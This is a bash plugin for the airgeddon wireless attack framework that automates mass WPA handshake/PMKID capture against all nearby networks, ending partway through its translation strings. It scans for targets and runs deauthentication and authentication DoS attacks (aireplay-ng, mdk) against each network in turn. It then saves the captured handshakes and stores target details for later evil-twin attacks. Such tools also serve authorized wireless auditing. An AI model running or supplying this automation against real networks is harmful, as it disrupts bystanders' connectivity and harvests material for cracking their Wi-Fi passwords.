#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

plugin_name="Mass Handshake Capture"
plugin_description="Automated mass Handshake/PMKID capture for nearby networks"
plugin_author="xpz3"

#Enable/Disable Plugin 1=Enabled, 0=Disabled
plugin_enabled=1

plugin_minimum_ag_affected_version="11.50"
plugin_maximum_ag_affected_version=""

plugin_distros_supported=("*")

#User defined values

#The time in seconds for the DoS attack to run and deauth any clients
mass_handshake_capture_dos_attack_timeout=15

#The time in seconds to wait for capturing a handshake after the DoS attack windows gets automatically closed by airgeddon
handshake_capture_timeout_after_dos_exits=10
 
timeout_capture_handshake_decloak="${handshake_capture_timeout_after_dos_exits}"
timeout="${timeout_capture_handshake_decloak}"

#Default path to save captured targets will be set as <current_path_to_airgeddon/plugins/captured_handshakes/ if the path below is not set
mass_handshake_capture_default_save_path=""

#AP blacklist file name
mass_handshake_capture_ap_blacklist_name="ap_blacklist.txt"

#Default path to AP blacklist to avoid capturing handshake/PMKID for already captured ones
mass_handshake_capture_default_blacklist_path=""

#Enable/Disable AP blacklist
mass_handshake_capture_enable_blacklist=1

#Save target AP details on successful handshake/PMKID capture to automate evil twin on the target
mass_handshake_capture_save_target=1

#Default path to save target AP details
mass_handshake_capture_ap_details_path=""

#End of user defined values

function mass_handshake_capture_override_handshake_pmkid_decloaking_tools_menu() {

	debug_print

	clear
	language_strings "${language}" 120 "title"
	current_menu="handshake_pmkid_decloaking_tools_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 124 "separator"
	language_strings "${language}" 663 pmkid_dependencies[@]
	language_strings "${language}" 121
	language_strings "${language}" 122 clean_handshake_dependencies[@]
	language_strings "${language}" "mass_handshake_capture_text_1"
	language_strings "${language}" 727 "separator"
	language_strings "${language}" 725
	language_strings "${language}" 726 mdk_attack_dependencies[@]
	print_hint

	read -rp "> " handshake_option
	case ${handshake_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			explore_for_targets_option
		;;
		5)
			if contains_element "${handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hcxdumptool_version
				if compare_floats_greater_or_equal "${hcxdumptool_version}" "${minimum_hcxdumptool_bpf_version}"; then
					if hash tcpdump 2> /dev/null; then
						echo
						language_strings "${language}" 716 "yellow"
						capture_pmkid_handshake "pmkid"
					else
						echo
						language_strings "${language}" 715 "red"
						language_strings "${language}" 115 "read"
					fi
				else
					capture_pmkid_handshake "pmkid"
				fi
			fi
		;;
		6)
			capture_pmkid_handshake "handshake"
		;;
		7)
			if contains_element "${handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				clean_handshake_file_option
			fi
		;;
		8)
			mass_handshake_capture
		;;
		9)
			decloak_prequisites "deauth"
		;;
		10)
			if contains_element "${handshake_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				decloak_prequisites "dictionary"
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	handshake_pmkid_decloaking_tools_menu
}

function mass_handshake_capture_capture_pmkid_handshake() {

	debug_print

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then

		if ! explore_for_targets_option "WPA"; then
			return 1
		fi
	fi

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if [ "${channel}" -gt 14 ]; then
		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
			echo
			language_strings "${language}" 515 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	fi

	if ! validate_network_encryption_type "WPA"; then
		return 1
	fi

	if ! validate_network_type "personal"; then
		return 1
	fi

	if [ "${1}" = "handshake" ]; then
		mass_handshake_capture_dos_handshake_menu
		mass_handshake_capture_launch_handshake_capture
	else
		return
	fi
}

function mass_handshake_capture_override_validate_network_encryption_type() {

	debug_print

	case ${1} in
		"WPA"|"WPA2"|"WPA3")
			if [[ "${enc}" != "WPA" ]] && [[ "${enc}" != "WPA2" ]] && [[ "${enc}" != "WPA3" ]]; then
				return 1
			fi
		;;
		"WEP")
			if [ "${enc}" != "WEP" ]; then
				return 1
			fi
		;;
	esac

	return 0
}

function mass_handshake_capture_check_bssid_in_captured_file() {

	debug_print

	local nets_from_file
	nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	if [ "${3}" = "also_pmkid" ]; then
		get_aircrack_version
		if compare_floats_greater_or_equal "${aircrack_version}" "${aircrack_pmkid_version}"; then
			local nets_from_file2
			nets_from_file2=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake|handshake, with PMKID" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')
		fi
	fi

	if [ "${2}" != "silent" ]; then
		if [ ! -f "${1}" ]; then
			return 1
		fi

		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "only_handshake" ]]; then
			if [ "${nets_from_file}" = "" ]; then
				return 1
			fi
		fi

		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "also_pmkid" ]]; then
			if [[ "${nets_from_file}" = "" ]] && [[ "${nets_from_file2}" = "" ]]; then
				return 1
			fi
		fi
	fi

	declare -A bssids_detected
	declare -A bssids_detected_pmkid

	local option_counter
	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
			bssids_detected[${option_counter}]=${item}
		fi
	done

	if [[ "${3}" = "also_pmkid" ]] && [[ -n "${nets_from_file2}" ]]; then
		option_counter=0
		for item in ${nets_from_file2}; do
			if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
				option_counter=$((option_counter + 1))
				bssids_detected_pmkid[${option_counter}]=${item}
			fi
		done
	fi

	local handshake_captured=0
	local pmkid_captured=0

	for targetbssid in "${bssids_detected[@]}"; do
		if [ "${bssid}" = "${targetbssid}" ]; then
			handshake_captured=1
			break
		fi
	done

	if [[ "${3}" = "also_pmkid" ]] && [[ -n "${nets_from_file2}" ]]; then
		for targetbssid in "${bssids_detected_pmkid[@]}"; do
			if [ "${bssid}" = "${targetbssid}" ]; then
				pmkid_captured=1
				break
			fi
		done
	fi

	if [[ "${handshake_captured}" = "1" ]] || [[ "${pmkid_captured}" = "1" ]]; then
		if [[ "${2}" = "showing_msgs_capturing" ]] || [[ "${2}" = "showing_msgs_checking" ]]; then
			if ! is_wpa2_handshake "${1}" "${bssid}" > /dev/null 2>&1; then
				return 2
			fi
		fi
	fi

	if [[ "${handshake_captured}" = "1" ]] && [[ "${pmkid_captured}" = "0" ]]; then
		return 0
	elif [[ "${handshake_captured}" = "0" ]] && [[ "${pmkid_captured}" = "1" ]]; then
		return 0
	elif [[ "${handshake_captured}" = "1" ]] && [[ "${pmkid_captured}" = "1" ]]; then
		return 0
	else
		return 1
	fi
}

function mass_handshake_capture_handshake_capture_check() {

	debug_print

	local time_counter=0
	while true; do
		sleep 5
		if mass_handshake_capture_check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "silent" "only_handshake"; then
			break
		fi

		time_counter=$((time_counter + 5))
		if [ "${time_counter}" -ge "${timeout_capture_handshake_decloak}" ]; then
			break
		fi
	done

	kill "${processidcapture}" &> /dev/null
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		tmux kill-window -t "${session_name}:Capturing Handshake"
	fi
}

function mass_handshake_capture_launch_handshake_capture() {

	debug_print

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		processidattack=$!
		sleep "${sleeptimeattack}" && kill "${processidattack}" &> /dev/null
	else
		sleep "${sleeptimeattack}" && kill "${processidattack}" && kill_tmux_windows "Capturing Handshake" &> /dev/null
	fi

	mass_handshake_capture_handshake_capture_check

	mass_handshake_capture_check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "showing_msgs_capturing" "also_pmkid"
	case "$?" in
		"0")
			mass_handshake_capture_captured_handshakes_counter=$((mass_handshake_capture_captured_handshakes_counter + 1))
			handshakepath="${mass_handshake_capture_default_save_path}"
			handshakefilename="handshake-${bssid}.cap"
			handshakepath="${handshakepath}${handshakefilename}"
			enteredpath="${handshakepath}"
			if [ "${mass_handshake_capture_enable_blacklist}" -eq 1 ];then
					echo "${essid}" >>"${mass_handshake_capture_default_blacklist_path}${mass_handshake_capture_ap_blacklist_name}"
			fi
			if [ "${mass_handshake_capture_save_target}" -eq 1 ];then
					echo "${essid}|${bssid}|${channel}|${enc}|${handshakepath}" >>"${mass_handshake_capture_ap_details_path}${essid}.txt"
			fi

			cp "${tmpdir}${standardhandshake_filename}" "${enteredpath}"
		;;
		"1")
			return
		;;
		"2")
			return
		;;
	esac
}

function mass_handshake_capture_capture_handshake_window() {

	debug_print

	rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Capturing Handshake\"" "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}" "Capturing Handshake" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		get_tmux_process_id "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}"
		processidcapture="${global_process_pid}"
		global_process_pid=""
	else
		processidcapture=$!
	fi
}

function mass_handshake_capture_dos_handshake_menu() {

	debug_print

	if [ "${mass_handshake_capture_target_counter}" -eq 1 ];then
		clear
		language_strings "${language}" "mass_handshake_capture_text_2" "title"
		current_menu="dos_handshake_decloak_menu"
		initialize_menu_and_print_selections
		echo
		language_strings "${language}" 47 "green"
		print_simple_separator
		language_strings "${language}" 147
		print_simple_separator
		language_strings "${language}" 139 mdk_attack_dependencies[@]
		language_strings "${language}" 140 aireplay_attack_dependencies[@]
		language_strings "${language}" 141 mdk_attack_dependencies[@]
		print_hint
		read -rp "> " attack_handshake_decloak_option
		clear
		language_strings "${language}" "mass_handshake_capture_text_2" "title"
		print_iface_selected
		print_all_target_vars
		language_strings "${language}" "mass_handshake_capture_text_3" "yellow"
	fi

	case ${attack_handshake_decloak_option} in
		0)
			return
		;;
		1)
			if contains_element "${attack_handshake_decloak_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				if [ "${mass_handshake_capture_target_counter}" -eq 1 ];then
					if [ -z "${handshake_capture_timeout_after_dos_exits}" ];then
						ask_timeout "capture_handshake_decloak"
					fi
				fi
				mass_handshake_capture_capture_handshake_window
				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
				echo "${bssid}" > "${tmpdir}bl.txt"
				recalculate_windows_sizes
				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
					processidattack="${global_process_pid}"
					global_process_pid=""
				fi
				sleeptimeattack="${mass_handshake_capture_dos_attack_timeout}"
			fi
		;;
		2)
			if contains_element "${attack_handshake_decloak_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				if [ "${mass_handshake_capture_target_counter}" -eq 1 ];then
					if [ -z "${handshake_capture_timeout_after_dos_exits}" ];then
						ask_timeout "capture_handshake_decloak"
					fi
				fi
				mass_handshake_capture_capture_handshake_window
				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
				recalculate_windows_sizes
				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
					processidattack="${global_process_pid}"
					global_process_pid=""
				fi
				sleeptimeattack="${mass_handshake_capture_dos_attack_timeout}"
			fi
		;;
		3)
			if contains_element "${attack_handshake_decloak_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				if [ "${mass_handshake_capture_target_counter}" -eq 1 ];then
					if [ -z "${handshake_capture_timeout_after_dos_exits}" ];then
						ask_timeout "capture_handshake_decloak"
					fi
				fi
				mass_handshake_capture_capture_handshake_window
				recalculate_windows_sizes
				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "${mdk_command} ${interface} a -a ${bssid} -m"
					processidattack="${global_process_pid}"
					global_process_pid=""
				fi
				sleeptimeattack="${mass_handshake_capture_dos_attack_timeout}"
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac
}

#shellcheck disable=SC2164
function mass_handshake_capture_get_absolute_script_path() {

	debug_print

	if [ "${0}" != "${scriptname}" ];then
		mass_handshake_capture_relative_path=$(pwd)
		cd "${mass_handshake_capture_relative_path}"
		cd "${0%/*}"
		mass_handshake_capture_absolute_script_path=$(pwd)
	else
		mass_handshake_capture_absolute_script_path=$(pwd)
	fi
}

#shellcheck disable=SC2010
function mass_handshake_capture() {

	debug_print

	if [[ $(ls "${scriptfolder}" | grep "${scriptname}") == "" ]];then
		mass_handshake_capture_get_absolute_script_path
	else
		mass_handshake_capture_absolute_script_path="${scriptfolder}"
	fi
	if [ -z "${mass_handshake_capture_default_save_path}" ];then
		mass_handshake_capture_default_save_path="${mass_handshake_capture_absolute_script_path}"plugins/captured_handshakes/
		mass_handshake_capture_default_blacklist_path="${mass_handshake_capture_default_save_path}"
	fi
	if [ -z "${mass_handshake_capture_default_blacklist_path}" ];then
		mass_handshake_capture_default_blacklist_path="${mass_handshake_capture_default_save_path}"
	fi
	if [ -z "${mass_handshake_capture_ap_details_path}" ];then
		mass_handshake_capture_ap_details_path="${mass_handshake_capture_default_save_path}"targets/
	fi

	if [ ! -d "${mass_handshake_capture_default_save_path}" ]; then
		mkdir "${mass_handshake_capture_default_save_path}"
	fi
	mass_handshake_capture_captured_handshakes_counter=0
	mass_handshake_capture_grab_wpa_targets "WPA" "personal"

	essid=""
	channel=""
	bssid=""
	enc=""
	personal_network_selected=0
	enterprise_network_selected=0
	network_names=()
	channels=()
	macs=()
	encs=()
}

function mass_handshake_capture_grab_wpa_targets() {

	debug_print
	echo
	language_strings "${language}" 103 "title"
	language_strings "${language}" 65 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	echo

	local cypher_filter
	if [ -n "${1}" ]; then
		cypher_filter="${1}"
		case ${cypher_filter} in
			"WPA")
				#All, WPA, WPA2 and WPA3 including all Mixed modes
				if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]]; then
					return
				else
					language_strings "${language}" 215 "blue"
					echo
					language_strings "${language}" 361 "yellow"
				fi
			;;
		esac
		cypher_cmd=" --encrypt ${cypher_filter} "
	else
		return
	fi
	language_strings "${language}" 115 "read"

	tmpfiles_toclean=1
	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
	rm -rf "${tmpdir}clts.csv" > /dev/null 2>&1

	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
		airodump_band_modifier="bg"
	else
		airodump_band_modifier="abg"
	fi

	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Exploring for targets\"" "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets" "active"
	wait_for_process "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets"
	targetline=$(awk '/(^Station[s]?|^Client[es]?)/{print NR}' "${tmpdir}nws-01.csv" 2> /dev/null)
	targetline=$((targetline - 1))
	head -n "${targetline}" "${tmpdir}nws-01.csv" &> "${tmpdir}nws.csv"
	tail -n +"${targetline}" "${tmpdir}nws-01.csv" &> "${tmpdir}clts.csv"

	csvline=$(wc -l "${tmpdir}nws.csv" 2> /dev/null | awk '{print $1}')
	if [ "${csvline}" -le 3 ]; then
		echo
		language_strings "${language}" 68 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	rm -rf "${tmpdir}nws.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
	local i=0
	local enterprise_network_counter
	local pure_wpa3
	while IFS=, read -r exp_mac _ _ exp_channel _ exp_enc _ exp_auth exp_power _ _ _ exp_idlength exp_essid _; do

		pure_wpa3=""
		chars_mac=${#exp_mac}
		if [ "${chars_mac}" -ge 17 ]; then
			i=$((i + 1))
			if [ "${exp_power}" -lt 0 ]; then
				if [ "${exp_power}" -eq -1 ]; then
					exp_power=0
				else
					exp_power=$((exp_power + 100))
				fi
			fi

			exp_power=$(echo "${exp_power}" | awk '{gsub(/ /,""); print}')
			exp_essid=${exp_essid:1:${exp_idlength}}

			if [[ ${exp_channel} =~ ${valid_channels_24_and_5_ghz_regexp} ]]; then
				exp_channel=$(echo "${exp_channel}" | awk '{gsub(/ /,""); print}')
			else
				exp_channel=0
			fi

			if [[ "${exp_essid}" = "" ]] || [[ "${exp_channel}" = "-1" ]]; then
				exp_essid="(Hidden Network)"
			fi

			exp_enc=$(echo "${exp_enc}" | awk '{print $1}')

			if [ -n "${1}" ]; then
				case ${cypher_filter} in
					"WEP")
						#Only WEP
						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc},${exp_auth}" >> "${tmpdir}nws.txt"
					;;
					"WPA1")
						#Only WPA including WPA/WPA2 in Mixed mode
						#Not used yet in airgeddon
						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc},${exp_auth}" >> "${tmpdir}nws.txt"
					;;
					"WPA2")
						#Only WPA2 including WPA/WPA2 and WPA2/WPA3 in Mixed mode
						#Not used yet in airgeddon
						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc},${exp_auth}" >> "${tmpdir}nws.txt"
					;;
					"WPA3")
						#Only WPA3 including WPA2/WPA3 in Mixed mode
						#Not used yet in airgeddon
						echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc},${exp_auth}" >> "${tmpdir}nws.txt"
					;;
					"WPA")
						#All, WPA, WPA2 and WPA3 including all Mixed modes
						if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]]; then
							if [[ "${exp_auth}" =~ MGT ]] || [[ "${exp_auth}" =~ CMAC && ! "${exp_auth}" =~ PSK ]]; then
								enterprise_network_counter=$((enterprise_network_counter + 1))
								echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc},${exp_auth}" >> "${tmpdir}nws.txt"
							fi
						else
							[[ ${exp_auth} =~ ^[[:blank:]](SAE)$ ]] && pure_wpa3="${BASH_REMATCH[1]}"
							if [ "${pure_wpa3}" != "SAE" ]; then
								echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc},${exp_auth}" >> "${tmpdir}nws.txt"
							fi
						fi
					;;
				esac
			else
				echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc},${exp_auth}" >> "${tmpdir}nws.txt"
			fi
		fi
	done < "${tmpdir}nws.csv"

	if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]] && [[ "${enterprise_network_counter}" -eq 0 ]]; then
		return
	fi

	sort -t "," -d -k 3 "${tmpdir}nws.txt" > "${tmpdir}wnws.txt"
	grep -v "Hidden" "${tmpdir}wnws.txt" > "${tmpdir}wnws1.txt" && mv "${tmpdir}wnws1.txt" "${tmpdir}wnws.txt"
	if [ "${mass_handshake_capture_enable_blacklist}" -eq 1 ];then
		grep -vFf "${mass_handshake_capture_default_blacklist_path}${mass_handshake_capture_ap_blacklist_name}" "${tmpdir}wnws.txt" >"${tmpdir}wnws2.txt" && mv "${tmpdir}wnws2.txt" "${tmpdir}wnws.txt"
	fi
	mass_handshake_capture_get_targets_count
	mass_handshake_capture_automate
}

function mass_handshake_capture_get_targets_count() {

	debug_print

	mass_handshake_capture_targets_count=$(wc -l "${tmpdir}wnws.txt" 2> /dev/null | awk '{print $1}')
}

function mass_handshake_capture_automate() {

	debug_print

	local mass_handshake_capture_target_counter=1

	while [ "${mass_handshake_capture_target_counter}" -le "${mass_handshake_capture_targets_count}" ]; do
		mass_handshake_capture_select_target_and_start_capturing
		mass_handshake_capture_target_counter=$((mass_handshake_capture_target_counter + 1))
	done

	echo
	language_strings "${language}" "mass_handshake_capture_text_4" "yellow"
	language_strings "${language}" 115 "read"
}

function mass_handshake_capture_select_target_and_start_capturing() {

	debug_print

	mass_handshake_capture_read_targets
}

function mass_handshake_capture_read_targets() {

	debug_print

	local i=0
	while IFS=, read -r exp_mac exp_channel exp_power exp_essid exp_enc exp_auth; do

		i=$((i + 1))

		if [ "${i}" -le 9 ]; then
			sp1=" "
		else
			sp1=""
		fi

		if [ "${exp_channel}" -le 9 ]; then
			sp2="  "
			if [ "${exp_channel}" -eq 0 ]; then
				exp_channel="-"
			fi
			if [ "${exp_channel}" -lt 0 ]; then
				sp2=" "
			fi
		elif [[ "${exp_channel}" -ge 10 ]] && [[ "${exp_channel}" -lt 99 ]]; then
			sp2=" "
		else
			sp2=""
		fi

		if [ "${exp_power}" = "" ]; then
			exp_power=0
		fi

		if [ "${exp_power}" -le 9 ]; then
			sp4=" "
		else
			sp4=""
		fi

		airodump_color="${normal_color}"
		client=$(grep "${exp_mac}" < "${tmpdir}clts.csv")
		if [ "${client}" != "" ]; then
			airodump_color="${yellow_color}"
			client="*"
			sp5=""
		else
			sp5=" "
		fi

		enc_length=${#exp_enc}
		if [ "${enc_length}" -gt 3 ]; then
			sp6=""
		elif [ "${enc_length}" -eq 0 ]; then
			sp6="    "
		else
			sp6=" "
		fi

		network_names["${i}"]=${exp_essid}
		channels["${i}"]=${exp_channel}
		macs["${i}"]=${exp_mac}
		encs["${i}"]=${exp_enc}
		types["${i}"]=${exp_auth}
	done < "${tmpdir}wnws.txt"

	essid=${network_names[${mass_handshake_capture_target_counter}]}
	channel=${channels[${mass_handshake_capture_target_counter}]}
	bssid=${macs[${mass_handshake_capture_target_counter}]}
	enc=${encs[${mass_handshake_capture_target_counter}]}

	if [[ "${types[${mass_handshake_capture_target_counter}]}" =~ MGT ]] || [[ "${types[${mass_handshake_capture_target_counter}]}" =~ CMAC && ! "${types[${mass_handshake_capture_target_counter}]}" =~ PSK ]]; then
		enterprise_network_selected=1
		personal_network_selected=0
	else
		enterprise_network_selected=0
		personal_network_selected=1
	fi

	set_personal_enterprise_text

	clear
	language_strings "${language}" "mass_handshake_capture_text_2" "title"
	print_iface_selected
	print_all_target_vars
	echo
	language_strings "${language}" "mass_handshake_capture_text_3" "yellow"
	mass_handshake_capture_capture_pmkid_handshake "handshake"
}

#Prehook for hookable_for_languages function to modify language strings
#shellcheck disable=SC1111
function mass_handshake_capture_prehook_hookable_for_languages() {

	arr["ENGLISH","mass_handshake_capture_text_1"]="8.  Massive Handshake/PMKID capture"
	arr["SPANISH","mass_handshake_capture_text_1"]="8.  Captura masiva de Handshake/PMKID"
	arr["FRENCH","mass_handshake_capture_text_1"]="\${pending_of_translation} 8.  Capture de Handshake/PMKID massive"
	arr["CATALAN","mass_handshake_capture_text_1"]="\${pending_of_translation} 8.  Copa massiva de Handshake/PMKID"
	arr["PORTUGUESE","mass_handshake_capture_text_1"]="\${pending_of_translation} 8.  Captura massiva de Handshake/PMKID"
	arr["RUSSIAN","mass_handshake_capture_text_1"]="\${pending_of_translation} 8.  Массивное Handshake/PMKID захват"
	arr["GREEK","mass_handshake_capture_text_1"]="\${pending_of_translation} 8.  Μαζική χειραψία/PMKID σύλληψη"
	arr["ITALIAN","mass_handshake_capture_text_1"]="\${pending_of_translation} 8.  Massiccia cattura di Handshake/PMKID"
	arr["POLISH","mass_handshake_capture_text_1"]="\${pending_of_translation} 8.  Ogromny uścisk przechwytywanie Handshake/PMKID"
	arr["GERMAN","mass_handshake_capture_text_1"]="\${pending_of_translation} 8.  Massive Handshake/PMKID-Erfassung"
	arr["TURKISH","mass_handshake_capture_text_1"]="\${pending_of_translation} 8.  Büyük el Handshake/PMKID yakalama"
	arr["ARABIC","mass_handshake_capture_text_1"]="\${pending_of_translation} 8.  Handshake/PMKID ضخمة/التقاط"
	arr["CHINESE","mass_handshake_capture_text_1"]="\${pending_of_translation} 8.  大量握手/PMKID捕获"

	arr["ENGLISH","mass_handshake_capture_text_2"]="Massive Handshake/PMKID capture"
	arr["SPANISH","mass_handshake_capture_text_2"]="Captura masiva de Handshake/PMKID"
	arr["FRENCH","mass_handshake_capture_text_2"]="\${pending_of_translation} Capture de Handshake/PMKID massive"
	arr["CATALAN","mass_handshake_capture_text_2"]="\${pending_of_translation} Copa massiva de Handshake/PMKID"
	arr["PORTUGUESE","mass_handshake_capture_text_2"]="\${pending_of_translation} Captura massiva de Handshake/PMKID"
	arr["RUSSIAN","mass_handshake_capture_text_2"]="\${pending_of_translation} Массивное Handshake/PMKID захват"
	arr["GREEK","mass_handshake_capture_text_2"]="\${pending_of_translation} Μαζική χειραψία/PMKID σύλληψη"
	arr["ITALIAN","mass_handshake_capture_text_2"]="\${pending_of_translation} Massiccia cattura di Handshake/PMKID"
	arr["POLISH","mass_handshake_capture_text_2"]="\${pending_of_translation} Ogromny uścisk przechwytywanie Handshake/PMKID"
	arr["GERMAN","mass_handshake_capture_text_2"]="\${pending_of_translation} Massive Handshake/PMKID-Erfassung"
	arr["TURKISH","mass_handshake_capture_text_2"]="\${pending_of_translation} Büyük el Handshake/PMKID yakalama"
	arr["ARABIC","mass_handshake_capture_text_2"]="\${pending_of_translation} Handshake/PMKID ضخمة/التقاط"
	arr["CHINESE","mass_handshake_capture_text_2"]="\${pending_of_translation} 大量握手/PMKID捕获"

	arr["ENGLISH","mass_handshake_capture_text_3"]="Trying AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["SPANISH","mass_handshake_capture_text_3"]="Probando en AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["FRENCH","mass_handshake_capture_text_3"]="\${pending_of_translation} Test dans AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["CATALAN","mass_handshake_capture_text_3"]="\${pending_of_translation} Prova a l’AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["PORTUGUESE","mass_handshake_capture_text_3"]="\${pending_of_translation} Teste em AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["RUSSIAN","mass_handshake_capture_text_3"]="\${pending_of_translation} Тестирование в AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["GREEK","mass_handshake_capture_text_3"]="\${pending_of_translation} Δοκιμές σε AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["ITALIAN","mass_handshake_capture_text_3"]="\${pending_of_translation} Test in AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["POLISH","mass_handshake_capture_text_3"]="\${pending_of_translation} Testowanie w AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["GERMAN","mass_handshake_capture_text_3"]="\${pending_of_translation} Tests in AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["TURKISH","mass_handshake_capture_text_3"]="\${pending_of_translation} AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count} de test"
	arr["ARABIC","mass_handshake_capture_text_3"]="\${pending_of_translation} الاختبار في AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}"
	arr["CHINESE","mass_handshake_capture_text_3"]="\${pending_of_translation} 在AP \${mass_handshake_capture_target_counter}/\${mass_handshake_capture_targets_count}中进行测试"

	arr["ENGLISH","mass_handshake_capture_text_4"]="Captured \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID of \${mass_handshake_capture_targets_count} APs"
	arr["SPANISH","mass_handshake_capture_text_4"]="Capturados \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID de \${mass_handshake_capture_targets_count} APs"
	arr["FRENCH","mass_handshake_capture_text_4"]="\${pending_of_translation} Capturé \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID de \${mass_handshake_capture_targets_count} APs"
	arr["CATALAN","mass_handshake_capture_text_4"]="\${pending_of_translation} Capturat \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID de \${mass_handshake_capture_targets_count} APs"
	arr["PORTUGUESE","mass_handshake_capture_text_4"]="\${pending_of_translation} Capturado \${mass_handshake_capture_captured_handshakes_counter} handshakes/PMKID de \${mass_handshake_capture_targets_count} APs"
